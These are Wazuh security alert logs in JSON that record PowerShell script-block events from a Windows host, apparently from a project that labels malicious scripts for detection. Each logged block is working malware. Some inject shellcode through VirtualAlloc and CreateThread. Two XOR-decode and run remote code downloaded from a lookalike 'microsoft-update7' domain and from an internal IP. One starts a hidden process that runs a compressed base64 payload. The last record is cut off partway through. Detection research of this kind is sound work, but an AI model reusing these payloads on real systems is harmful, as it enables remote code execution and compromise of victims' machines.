{"timestamp":"2026-07-06T02:21:00.810+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":170,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304460.3684175","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:21:20.6299132Z","eventRecordID":"145581","processID":"4412","threadID":"2824","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$br3a = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $br3a -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xcb,0xbf,0xd2,0x10,0x3a,0x33,0xd9,0x74,0x24,0xf4,0x5e,0x33,0xc9,0xb1,0x47,0x83,0xc6,0x04,0x31,0x7e,0x14,0x03,0x7e,0xc6,0xf2,0xcf,0xcf,0x0e,0x70,0x2f,0x30,0xce,0x15,0xb9,0xd5,0xff,0x15,0xdd,0x9e,0xaf,0xa5,0x95,0xf3,0x43,0x4d,0xfb,0xe7,0xd0,0x23,0xd4,0x08,0x51,0x89,0x02,0x26,0x62,0xa2,0x77,0x29,0xe0,0xb9,0xab,0x89,0xd9,0x71,0xbe,0xc8,0x1e,0x6f,0x33,0x98,0xf7,0xfb,0xe6,0x0d,0x7c,0xb1,0x3a,0xa5,0xce,0x57,0x3b,0x5a,0x86,0x56,0x6a,0xcd,0x9d,0x00,0xac,0xef,0x72,0x39,0xe5,0xf7,0x97,0x04,0xbf,0x8c,0x63,0xf2,0x3e,0x45,0xba,0xfb,0xed,0xa8,0x73,0x0e,0xef,0xed,0xb3,0xf1,0x9a,0x07,0xc0,0x8c,0x9c,0xd3,0xbb,0x4a,0x28,0xc0,0x1b,0x18,0x8a,0x2c,0x9a,0xcd,0x4d,0xa6,0x90,0xba,0x1a,0xe0,0xb4,0x3d,0xce,0x9a,0xc0,0xb6,0xf1,0x4c,0x41,0x8c,0xd5,0x48,0x0a,0x56,0x77,0xc8,0xf6,0x39,0x88,0x0a,0x59,0xe5,0x2c,0x40,0x77,0xf2,0x5c,0x0b,0x1f,0x37,0x6d,0xb4,0xdf,0x5f,0xe6,0xc7,0xed,0xc0,0x5c,0x40,0x5d,0x88,0x7a,0x97,0xa2,0xa3,0x3b,0x07,0x5d,0x4c,0x3c,0x01,0x99,0x18,0x6c,0x39,0x08,0x21,0xe7,0xb9,0xb5,0xf4,0x92,0xbc,0x21,0xde,0x8b,0x9b,0xac,0x48,0x4e,0xe4,0xde,0x69,0xc7,0x02,0x8e,0x39,0x88,0x9a,0x6e,0xea,0x68,0x4b,0x06,0xe0,0x66,0xb4,0x36,0x0b,0xad,0xdd,0xdc,0xe4,0x18,0xb5,0x48,0x9c,0x00,0x4d,0xe9,0x61,0x9f,0x2b,0x29,0xe9,0x2c,0xcb,0xe7,0x1a,0x58,0xdf,0x9f,0xea,0x17,0xbd,0x09,0xf4,0x8d,0xa8,0xb5,0x60,0x2a,0x7b,0xe2,0x1c,0x30,0x5a,0xc4,0x82,0xcb,0x89,0x5f,0x0a,0x5e,0x72,0x37,0x73,0x8e,0x72,0xc7,0x25,0xc4,0x72,0xaf,0x91,0xbc,0x20,0xca,0xdd,0x68,0x55,0x47,0x48,0x93,0x0c,0x34,0xdb,0xfb,0xb2,0x63,0x2b,0xa4,0x4d,0x46,0xad,0x98,0x9b,0xae,0xdb,0xf0,0x1f;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$Fis=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($Fis.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$Fis,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 4c3bbc06-4df4-450c-ba22-81de78ab9903\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\3261.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$br3a = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $br3a -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xcb,0xbf,0xd2,0x10,0x3a,0x33,0xd9,0x74,0x24,0xf4,0x5e,0x33,0xc9,0xb1,0x47,0x83,0xc6,0x04,0x31,0x7e,0x14,0x03,0x7e,0xc6,0xf2,0xcf,0xcf,0x0e,0x70,0x2f,0x30,0xce,0x15,0xb9,0xd5,0xff,0x15,0xdd,0x9e,0xaf,0xa5,0x95,0xf3,0x43,0x4d,0xfb,0xe7,0xd0,0x23,0xd4,0x08,0x51,0x89,0x02,0x26,0x62,0xa2,0x77,0x29,0xe0,0xb9,0xab,0x89,0xd9,0x71,0xbe,0xc8,0x1e,0x6f,0x33,0x98,0xf7,0xfb,0xe6,0x0d,0x7c,0xb1,0x3a,0xa5,0xce,0x57,0x3b,0x5a,0x86,0x56,0x6a,0xcd,0x9d,0x00,0xac,0xef,0x72,0x39,0xe5,0xf7,0x97,0x04,0xbf,0x8c,0x63,0xf2,0x3e,0x45,0xba,0xfb,0xed,0xa8,0x73,0x0e,0xef,0xed,0xb3,0xf1,0x9a,0x07,0xc0,0x8c,0x9c,0xd3,0xbb,0x4a,0x28,0xc0,0x1b,0x18,0x8a,0x2c,0x9a,0xcd,0x4d,0xa6,0x90,0xba,0x1a,0xe0,0xb4,0x3d,0xce,0x9a,0xc0,0xb6,0xf1,0x4c,0x41,0x8c,0xd5,0x48,0x0a,0x56,0x77,0xc8,0xf6,0x39,0x88,0x0a,0x59,0xe5,0x2c,0x40,0x77,0xf2,0x5c,0x0b,0x1f,0x37,0x6d,0xb4,0xdf,0x5f,0xe6,0xc7,0xed,0xc0,0x5c,0x40,0x5d,0x88,0x7a,0x97,0xa2,0xa3,0x3b,0x07,0x5d,0x4c,0x3c,0x01,0x99,0x18,0x6c,0x39,0x08,0x21,0xe7,0xb9,0xb5,0xf4,0x92,0xbc,0x21,0xde,0x8b,0x9b,0xac,0x48,0x4e,0xe4,0xde,0x69,0xc7,0x02,0x8e,0x39,0x88,0x9a,0x6e,0xea,0x68,0x4b,0x06,0xe0,0x66,0xb4,0x36,0x0b,0xad,0xdd,0xdc,0xe4,0x18,0xb5,0x48,0x9c,0x00,0x4d,0xe9,0x61,0x9f,0x2b,0x29,0xe9,0x2c,0xcb,0xe7,0x1a,0x58,0xdf,0x9f,0xea,0x17,0xbd,0x09,0xf4,0x8d,0xa8,0xb5,0x60,0x2a,0x7b,0xe2,0x1c,0x30,0x5a,0xc4,0x82,0xcb,0x89,0x5f,0x0a,0x5e,0x72,0x37,0x73,0x8e,0x72,0xc7,0x25,0xc4,0x72,0xaf,0x91,0xbc,0x20,0xca,0xdd,0x68,0x55,0x47,0x48,0x93,0x0c,0x34,0xdb,0xfb,0xb2,0x63,0x2b,0xa4,0x4d,0x46,0xad,0x98,0x9b,0xae,0xdb,0xf0,0x1f;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$Fis=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($Fis.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$Fis,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"4c3bbc06-4df4-450c-ba22-81de78ab9903","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\3261.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:21:04.822+0000","rule":{"level":4,"description":"Powershell executed \"Get-Content -Stream or Invoke-Expresion\". Possible string execution as code","id":"91837","mitre":{"id":["T1059.001"],"tactic":["Execution"],"technique":["PowerShell"]},"firedtimes":10,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304464.3695532","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"5","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:21:25.4267170Z","eventRecordID":"145595","processID":"8904","threadID":"5848","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"VERBOSE","message":"\"Creating Scriptblock text (1 of 1):\r\n$wC=NeW-OBject SySTeM.Net.WeBCliEnT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HeAdeRS.ADd('User-Agent',$u);$Wc.PROXY = [SysTEM.NEt.WEBREQUEsT]::DefauLtWEBPrOXY;$WC.PRoxY.CrEdENTiAls = [SysTEM.Net.CrEDenTiAlCAchE]::DEFauLTNEtwoRkCrEdeNtiaLs;$K='143b0e92d8152b36582759b2cae67a98';$i=0;[cHAR[]]$b=([ChaR[]]($WC.DOWNloADSTRing(\"http://microsoft-update7.myvnc.com:443/index.asp\")))|%{$_-BXOr$K[$i++%$k.LengtH]};IEX ($b-joiN'')\r\n\r\nScriptBlock ID: 7d9df094-7b07-44b8-bcbc-64fad1af840b\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\3308.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$wC=NeW-OBject SySTeM.Net.WeBCliEnT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HeAdeRS.ADd('User-Agent',$u);$Wc.PROXY = [SysTEM.NEt.WEBREQUEsT]::DefauLtWEBPrOXY;$WC.PRoxY.CrEdENTiAls = [SysTEM.Net.CrEDenTiAlCAchE]::DEFauLTNEtwoRkCrEdeNtiaLs;$K='143b0e92d8152b36582759b2cae67a98';$i=0;[cHAR[]]$b=([ChaR[]]($WC.DOWNloADSTRing(\\\"http://microsoft-update7.myvnc.com:443/index.asp\\\")))|%{$_-BXOr$K[$i++%$k.LengtH]};IEX ($b-joiN'')","scriptBlockId":"7d9df094-7b07-44b8-bcbc-64fad1af840b","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\3308.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:21:07.486+0000","rule":{"level":10,"description":"Powershell script may be using Base64 decoding method","id":"91809","mitre":{"id":["T1140"],"tactic":["Defense Evasion"],"technique":["Deobfuscate/Decode Files or Information"]},"firedtimes":20,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304467.3699378","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:21:27.9846064Z","eventRecordID":"145602","processID":"3476","threadID":"980","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\nif([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIALvNCVgCA7VWf2/aPBD+u5P2HaIJiUSjhF9ru0qTXoeQQiEtNBAKDE1u4gSDE7PEocC27/5egKxU66a+k96oFXbuznd+7rm7eEnoCMpDyQu2yzNzKH17++akiyMcSHKON/3qF7cg5dbJ3KjiTaycnIA4N++PDE/6JMkTtFzqPMA0nF5e1pMoIqHY74tXRKA4JsEDoySWFem7NJyRiJzePsyJI6RvUu5L8YrxB8wOaps6dmZEOkWhm8o63MFpYEVryaiQ858/55XJaXlabHxNMIvlvLWJBQmKLmN5RfqhpA77myWR8yZ1Ih5zTxSHNKxWioMwxh65gdNWxCRixt04r8A14C8iIolCaX+h9IS9XM7DshtxB7luRGJQL7bCFV8QORcmjBWkf+TJwf1dEgoaEJALEvGlRaIVdUhcbOLQZeSOeFP5hjxmt36tkXxsBFpdESkFSMhLcZrcTRjZm+aVXyM9ZFGB5ziTgMCPt2/evvEyAoRidn7nG5X+MQVgdTLZrQmEKnd5THfKn6RSQTLBJxY82sA2148SokylSZqDyXQq5eKg8qFc+P0B5UwbdGeOveBni023rddANLE5dadgekhTLnxoaBdnO9HvGacTj4ZE34Q4oE5GKvkl+InHyO7SxUztBuKT8wcBcXXCiI9FimdBmvxq1gio+GmrJZS5JEIOpDCGqCC7yvNg9imS863QJAHgtd/nIR0eUJlk2gf6bjLv6R6U8nWG47ggdROoJacgWQQzAlWJwpgeRCgRfLfMP4VrJkxQB8ciO26qHEF5cFnnYSyixIEswvX71pI4FLMUjYLUpC7RNhb1M9f5F7GoY8Zo6MNJK8gFvEkxsETKjSjtHTseKEWLiFawZCQApV1hGwz7UMaHWtixCfvEzb8QZcb2PbVTSDIsjmKEPFuMi4Jk00hAi0jhPebVX4Zy1CWyoOoROWRHzqpoom1ESvscGSy+uClPD0DtYIkEQGJEPNBwTM5qlogAMPmdekvrCJ5RK2Smoy1oGT3ScsuE/wGttrh+7rav50010tczD7Xiltns6r1ms7a6tuyasBot0e62hNm4n88t1LwbjMS4hZp9WlqMatvlNd1aHeSO1urZVts+lrT1du673kj3PP/cs+7KHwzaGdZ7WqmCO3oj6Qy1R61Uixv0sdmjg97i2hAPI5vhgaf69+WPmK470dwuc3PbQuhqVnW21559NTPdzaipfhzWFqiBUD1s2IbG2yMtQl3Vxr7NH9u+hgO/jjTHpGTcGxhar2doaHA1/6p/VH2wvcczbWhX6Hh5fzeDvQEhtNVSreWSLR/1AKQrjrB/Bzp+veLMPNDR3yPt/Q2PK3ihcaSBjjH+CnGNlkaXgbw/qHBks5t7jDrjjaGq5VG3hpolOrzyUXok9rUeRvFK3+pq2Xa5O/xwM/JU+56dq3q9v3Q8VVUfm3rbGZfXF7fnF50htQOOBqpqv0u5AeTIra7rTWsUxPNqu32U99+1eBNH8Qwz4AO07qwyDR4Zhzbc5TS1kOVsHi9IFBIGYwwGXUZtxBh30oHw1LNhIu3nxBSKdADLauXFlSL9VFSehkX26vJyDNFCpexoXOyQ0BezQmldLZWg35fWtRJc+/VXrPPlRt6fVUgHxjOwfnphOy9KWka5xW27c726GI6H/zuWhyqewY/7Kiyf3v1B+ip8S4XnSPwifv7iP2H+N1AMMRWgbEFXYmQ/K/+AyIFIR58aT1kDrniHJ/3ku03E6Q18h/wLKT6J7mYKAAA=''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);\r\n\r\nScriptBlock ID: 83edd2a3-5070-4a83-9ad2-69273c75767e\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\3318.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\\\\syswow64\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIALvNCVgCA7VWf2/aPBD+u5P2HaIJiUSjhF9ru0qTXoeQQiEtNBAKDE1u4gSDE7PEocC27/5egKxU66a+k96oFXbuznd+7rm7eEnoCMpDyQu2yzNzKH17++akiyMcSHKON/3qF7cg5dbJ3KjiTaycnIA4N++PDE/6JMkTtFzqPMA0nF5e1pMoIqHY74tXRKA4JsEDoySWFem7NJyRiJzePsyJI6RvUu5L8YrxB8wOaps6dmZEOkWhm8o63MFpYEVryaiQ858/55XJaXlabHxNMIvlvLWJBQmKLmN5RfqhpA77myWR8yZ1Ih5zTxSHNKxWioMwxh65gdNWxCRixt04r8A14C8iIolCaX+h9IS9XM7DshtxB7luRGJQL7bCFV8QORcmjBWkf+TJwf1dEgoaEJALEvGlRaIVdUhcbOLQZeSOeFP5hjxmt36tkXxsBFpdESkFSMhLcZrcTRjZm+aVXyM9ZFGB5ziTgMCPt2/evvEyAoRidn7nG5X+MQVgdTLZrQmEKnd5THfKn6RSQTLBJxY82sA2148SokylSZqDyXQq5eKg8qFc+P0B5UwbdGeOveBni023rddANLE5dadgekhTLnxoaBdnO9HvGacTj4ZE34Q4oE5GKvkl+InHyO7SxUztBuKT8wcBcXXCiI9FimdBmvxq1gio+GmrJZS5JEIOpDCGqCC7yvNg9imS863QJAHgtd/nIR0eUJlk2gf6bjLv6R6U8nWG47ggdROoJacgWQQzAlWJwpgeRCgRfLfMP4VrJkxQB8ciO26qHEF5cFnnYSyixIEswvX71pI4FLMUjYLUpC7RNhb1M9f5F7GoY8Zo6MNJK8gFvEkxsETKjSjtHTseKEWLiFawZCQApV1hGwz7UMaHWtixCfvEzb8QZcb2PbVTSDIsjmKEPFuMi4Jk00hAi0jhPebVX4Zy1CWyoOoROWRHzqpoom1ESvscGSy+uClPD0DtYIkEQGJEPNBwTM5qlogAMPmdekvrCJ5RK2Smoy1oGT3ScsuE/wGttrh+7rav50010tczD7Xiltns6r1ms7a6tuyasBot0e62hNm4n88t1LwbjMS4hZp9WlqMatvlNd1aHeSO1urZVts+lrT1du673kj3PP/cs+7KHwzaGdZ7WqmCO3oj6Qy1R61Uixv0sdmjg97i2hAPI5vhgaf69+WPmK470dwuc3PbQuhqVnW21559NTPdzaipfhzWFqiBUD1s2IbG2yMtQl3Vxr7NH9u+hgO/jjTHpGTcGxhar2doaHA1/6p/VH2wvcczbWhX6Hh5fzeDvQEhtNVSreWSLR/1AKQrjrB/Bzp+veLMPNDR3yPt/Q2PK3ihcaSBjjH+CnGNlkaXgbw/qHBks5t7jDrjjaGq5VG3hpolOrzyUXok9rUeRvFK3+pq2Xa5O/xwM/JU+56dq3q9v3Q8VVUfm3rbGZfXF7fnF50htQOOBqpqv0u5AeTIra7rTWsUxPNqu32U99+1eBNH8Qwz4AO07qwyDR4Zhzbc5TS1kOVsHi9IFBIGYwwGXUZtxBh30oHw1LNhIu3nxBSKdADLauXFlSL9VFSehkX26vJyDNFCpexoXOyQ0BezQmldLZWg35fWtRJc+/VXrPPlRt6fVUgHxjOwfnphOy9KWka5xW27c726GI6H/zuWhyqewY/7Kiyf3v1B+ip8S4XnSPwifv7iP2H+N1AMMRWgbEFXYmQ/K/+AyIFIR58aT1kDrniHJ/3ku03E6Q18h/wLKT6J7mYKAAA=''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);","scriptBlockId":"83edd2a3-5070-4a83-9ad2-69273c75767e","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\3318.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:21:09.682+0000","rule":{"level":4,"description":"Powershell executed \"Get-Content -Stream or Invoke-Expresion\". Possible string execution as code","id":"91837","mitre":{"id":["T1059.001"],"tactic":["Execution"],"technique":["PowerShell"]},"firedtimes":11,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304469.3710666","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"5","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:21:29.5678640Z","eventRecordID":"145613","processID":"8952","threadID":"6092","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"VERBOSE","message":"\"Creating Scriptblock text (1 of 1):\r\n$wC=NEw-ObJEct SyStEm.NEt.WEbClIeNT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HeADerS.Add('User-Agent',$u);$WC.PRoxY = [SYSTEm.Net.WebREquESt]::DEfAULtWeBPrOXy;$Wc.ProxY.CREDENTiaLS = [SystEm.NEt.CREDeNtiALCacHE]::DefauLTNetwOrKCREdEnTiAls;$K='c51ce410c124a10e0db5e4b97fc2af39';$I=0;[CHAR[]]$B=([chAR[]]($WC.DoWnloAdSTRiNg(\"http://192.168.10.11:7777/index.asp\")))|%{$_-BXOr$K[$I++%$k.LEnGth]};IEX ($b-jOin'')\r\n\r\nScriptBlock ID: cc597991-54c3-4114-91a2-fe9b08d75284\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\3331.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$wC=NEw-ObJEct SyStEm.NEt.WEbClIeNT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HeADerS.Add('User-Agent',$u);$WC.PRoxY = [SYSTEm.Net.WebREquESt]::DEfAULtWeBPrOXy;$Wc.ProxY.CREDENTiaLS = [SystEm.NEt.CREDeNtiALCacHE]::DefauLTNetwOrKCREdEnTiAls;$K='c51ce410c124a10e0db5e4b97fc2af39';$I=0;[CHAR[]]$B=([chAR[]]($WC.DoWnloAdSTRiNg(\\\"http://192.168.10.11:7777/index.asp\\\")))|%{$_-BXOr$K[$I++%$k.LEnGth]};IEX ($b-jOin'')","scriptBlockId":"cc597991-54c3-4114-91a2-fe9b08d75284","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\3331.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:21:09.768+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":171,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304469.3714460","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:21:30.3026918Z","eventRecordID":"145617","processID":"6732","threadID":"5344","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0x01,0xbd,0x77,0x57,0xda,0xdd,0xd9,0x74,0x24,0xf4,0x58,0x2b,0xc9,0xb1,0x47,0x31,0x50,0x13,0x03,0x50,0x13,0x83,0xe8,0xfd,0x5f,0x82,0xab,0x15,0x1d,0x6d,0x54,0xe5,0x42,0xe7,0xb1,0xd4,0x42,0x93,0xb2,0x46,0x73,0xd7,0x97,0x6a,0xf8,0xb5,0x03,0xf9,0x8c,0x11,0x23,0x4a,0x3a,0x44,0x0a,0x4b,0x17,0xb4,0x0d,0xcf,0x6a,0xe9,0xed,0xee,0xa4,0xfc,0xec,0x37,0xd8,0x0d,0xbc,0xe0,0x96,0xa0,0x51,0x85,0xe3,0x78,0xd9,0xd5,0xe2,0xf8,0x3e,0xad,0x05,0x28,0x91,0xa6,0x5f,0xea,0x13,0x6b,0xd4,0xa3,0x0b,0x68,0xd1,0x7a,0xa7,0x5a,0xad,0x7c,0x61,0x93,0x4e,0xd2,0x4c,0x1c,0xbd,0x2a,0x88,0x9a,0x5e,0x59,0xe0,0xd9,0xe3,0x5a,0x37,0xa0,0x3f,0xee,0xac,0x02,0xcb,0x48,0x09,0xb3,0x18,0x0e,0xda,0xbf,0xd5,0x44,0x84,0xa3,0xe8,0x89,0xbe,0xdf,0x61,0x2c,0x11,0x56,0x31,0x0b,0xb5,0x33,0xe1,0x32,0xec,0x99,0x44,0x4a,0xee,0x42,0x38,0xee,0x64,0x6e,0x2d,0x83,0x26,0xe6,0x82,0xae,0xd8,0xf6,0x8c,0xb9,0xab,0xc4,0x13,0x12,0x24,0x64,0xdb,0xbc,0xb3,0x8b,0xf6,0x79,0x2b,0x72,0xf9,0x79,0x65,0xb0,0xad,0x29,0x1d,0x11,0xce,0xa1,0xdd,0x9e,0x1b,0x5f,0xdb,0x08,0x08,0xb0,0xd1,0x44,0x38,0xb3,0x15,0x70,0x08,0x3a,0xf3,0x28,0x3a,0x6d,0xac,0x88,0xea,0xcd,0x1c,0x60,0xe1,0xc1,0x43,0x90,0x0a,0x08,0xec,0x3a,0xe5,0xe5,0x44,0xd2,0x9c,0xaf,0x1f,0x43,0x60,0x7a,0x5a,0x43,0xea,0x89,0x9a,0x0d,0x1b,0xe7,0x88,0xf9,0xeb,0xb2,0xf3,0xaf,0xf4,0x68,0x99,0x4f,0x61,0x97,0x08,0x18,0x1d,0x95,0x6d,0x6e,0x82,0x66,0x58,0xe5,0x0b,0xf3,0x23,0x91,0x73,0x13,0xa4,0x61,0x22,0x79,0xa4,0x09,0x92,0xd9,0xf7,0x2c,0xdd,0xf7,0x6b,0xfd,0x48,0xf8,0xdd,0x52,0xda,0x90,0xe3,0x8d,0x2c,0x3f,0x1b,0xf8,0xac,0x03,0xca,0xc4,0xda,0x6d,0xce;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: a25ab84e-2ac1-4a6b-9806-e40789a6e80a\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\334.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 